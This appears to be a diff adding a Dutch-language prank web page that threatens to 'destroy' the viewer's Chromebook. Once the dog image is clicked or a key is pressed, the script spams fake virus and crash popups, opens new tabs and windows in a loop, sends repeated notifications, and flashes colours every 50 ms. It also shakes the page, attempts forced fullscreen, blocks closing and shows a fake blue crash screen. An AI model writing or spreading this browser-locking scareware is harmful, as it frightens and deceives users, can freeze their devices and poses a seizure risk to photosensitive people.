@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <title>💀 JE CHROMEBOOK WORDT VERNIETIGD 💀</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: black;
+      cursor: none !important;
+    }
+    .dog {
+      position: absolute;
+      pointer-events: none;
+      z-index: 5;
+    }
+    .popup {
+      position: fixed;
+      background: #fff;
+      border: 4px solid #c00;
+      box-shadow: 0 0 40px red;
+      z-index: 2147483647;
+      min-width: 340px;
+      font-family: Arial, sans-serif;
+    }
+    .popup-header {
+      background: #c00;
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+      display: flex;
+      justify-content: space-between;
+      cursor: move;
+    }
+  </style>
+</head>
+<body>
+
+  <img id="trigger" src="https://picsum.photos/id/237/600/600" 
+       style="position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:500px;cursor:pointer;z-index:2000;">
+
+  <script>
+    let destroyed = false;
+    const trigger = document.getElementById('trigger');
+
+    function randomDog() {
+      const dog = document.createElement('img');
+      dog.className = 'dog';
+      const size = 20 + Math.random() * 250;
+      dog.src = `https://picsum.photos/id/237/${Math.floor(size)}/${Math.floor(size)}`;
+      dog.style.left = Math.random() * window.innerWidth + 'px';
+      dog.style.top = '-300px';
+      dog.style.width = size + 'px';
+      document.body.appendChild(dog);
+
+      setTimeout(() => {
+        dog.style.transition = `all ${1 + Math.random() * 2.5}s linear`;
+        dog.style.top = window.innerHeight + 200 + 'px';
+        dog.style.left = (parseFloat(dog.style.left) + (Math.random() * 1200 - 600)) + 'px';
+        dog.style.transform = `rotate(${Math.random() * 3000 - 1500}deg)`;
+      }, 30);
+
+      setTimeout(() => dog.remove(), 8000);
+    }
+
+    function createAggressivePopup() {
+      const popup = document.createElement('div');
+      popup.className = 'popup';
+      popup.style.left = (Math.random() * (window.innerWidth - 400)) + 'px';
+      popup.style.top = (Math.random() * (window.innerHeight - 280)) + 'px';
+
+      const titles = ["⚠️ KRITIEKE FOUT", "🚨 VIRUSWAARSCHUWING", "💀 SYSTEEM CRASH", "🐕 HONDEN VIRUS", "❗ ONMIDDELLIJKE HERSTART", "ERROR 0xDEADBEAF"];
+      const bodies = [
+        "Je Chromebook is onherstelbaar beschadigd.<br><strong>Alle gegevens worden verwijderd door honden.</strong>",
+        "999+ honden hebben je systeem overgenomen.",
+        "CPU: 9999°C — RAM: VOL — HONDEN: OVERAL",
+        "Dit venster kan niet gesloten worden.",
+        "Chrome OS heeft gefaald. Herstart geforceerd."
+      ];
+
+      popup.innerHTML = `
+        <div class="popup-header">
+          <span>${titles[Math.floor(Math.random()*titles.length)]}</span>
+          <span style="cursor:pointer;background:black;padding:0 6px;">✕</span>
+        </div>
+        <div style="padding:20px;color:#000;font-size:1.15rem;">
+          ${bodies[Math.floor(Math.random()*bodies.length)]}<br><br>
+          <button style="background:red;color:white;padding:12px 24px;font-size:1.1rem;border:none;margin-right:10px;">Herstart Nu</button>
+          <button style="padding:12px 24px;">Annuleren</button>
+        </div>
+      `;
+
+      document.body.appendChild(popup);
+
+      // Draggable
+      let dragging = false, offsetX, offsetY;
+      const header = popup.querySelector('.popup-header');
+      header.addEventListener('mousedown', e => {
+        dragging = true;
+        offsetX = e.clientX - popup.offsetLeft;
+        offsetY = e.clientY - popup.offsetTop;
+      });
+
+      document.addEventListener('mousemove', e => {
+        if (dragging) {
+          popup.style.left = (e.clientX - offsetX) + 'px';
+          popup.style.top = (e.clientY - offsetY) + 'px';
+        }
+      });
+      document.addEventListener('mouseup', () => dragging = false);
+
+      popup.querySelector('span[style*="cursor"]').addEventListener('click', () => popup.remove());
+
+      setTimeout(() => { if (popup.parentNode) popup.remove(); }, 5000);
+    }
+
+    function totalDestruction() {
+      if (destroyed) return;
+      destroyed = true;
+
+      document.body.style.cursor = 'none';
+
+      // MAX HONDEN
+      for (let i = 0; i < 150; i++) setTimeout(randomDog, i * 6);
+      setInterval(() => { for (let i = 0; i < 12; i++) randomDog(); }, 25);
+
+      // EXTREEM VEEL POP-UPS
+      setInterval(createAggressivePopup, 90);   // Zeer snel
+
+      // Probeer constante nieuwe tabs / windows
+      setInterval(() => {
+        try {
+          window.open(location.href, "_blank");
+          window.open("https://picsum.photos/id/237/400/300", "_blank", "width=420,height=320");
+        } catch(e) {}
+      }, 280);
+
+      // Browser notifications
+      if ("Notification" in window) {
+        Notification.requestPermission().then(() => {
+          setInterval(() => {
+            new Notification("💀 JE CHROMEBOOK IS KAPOT 💀", {
+              body: "Honden hebben je systeem volledig overgenomen. Herstart onmiddellijk!",
+              icon: "https://picsum.photos/id/237/200/200"
+            });
+          }, 450);
+        });
+      }
+
+      // Extreme visuele chaos
+      setInterval(() => {
+        document.body.style.background = `hsl(${Math.random()*360},100%,50%)`;
+        document.body.style.filter = `hue-rotate(${Math.random()*720}deg) contrast(3)`;
+      }, 50);
+
+      setInterval(() => {
+        document.body.style.transform = `translate(${Math.random()*60-30}px, ${Math.random()*60-30}px) rotate(${Math.random()*15-7.5}deg)`;
+      }, 20);
+
+      // Probeer fullscreen lock
+      try { document.documentElement.requestFullscreen(); } catch(e) {}
+
+      // Before unload (moeilijk te sluiten)
+      window.addEventListener('beforeunload', (e) => {
+        if (destroyed) {
+          e.preventDefault();
+          e.returnValue = "JE CHROMEBOOK GAAT NOG NIET DICHT!";
+        }
+      });
+
+      // Titel spam
+      setInterval(() => {
+        document.title = ["💀 KAPOT", "🐕 HONDEN WINNEN", "ERROR", "RESTART VERPLICHT"][Math.floor(Math.random()*4)];
+      }, 80);
+
+      // Fake BSOD na 3 seconden
+      setTimeout(() => {
+        const bsod = document.createElement('div');
+        bsod.style.cssText = `position:fixed;inset:0;background:#0078d7;color:white;z-index:2147483647;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:2.8rem;text-align:center;`;
+        bsod.innerHTML = `<h1>:(</h1><p>Je Chromebook is onherstelbaar vernietigd.<br><strong>Honden hebben gewonnen.</strong></p>`;
+        document.body.appendChild(bsod);
+      }, 3200);
+    }
+
+    // START
+    trigger.addEventListener('click', () => {
+      trigger.style.transition = 'all 0.4s';
+      trigger.style.transform = 'translate(-50%,-50%) scale(0.05) rotate(3600deg)';
+      setTimeout(totalDestruction, 300);
+    });
+
+    document.addEventListener('keydown', totalDestruction);
+    document.addEventListener('mousemove', () => { if (destroyed) randomDog(); });
+
+    const warn = document.createElement('div');
+    warn.style.cssText = `position:fixed;top:15px;left:50%;transform:translateX(-50%);color:#f00;font-size:2.4rem;z-index:3000;text-align:center;text-shadow:0 0 20px #fff;`;
+    warn.innerHTML = '🔴 DIT IS NIET VEILIG 🔴<br>KLICK OP DE HOND ALS JE ECHT DURFT';
+    document.body.appendChild(warn);
+  </script>
+</body>
+</html>
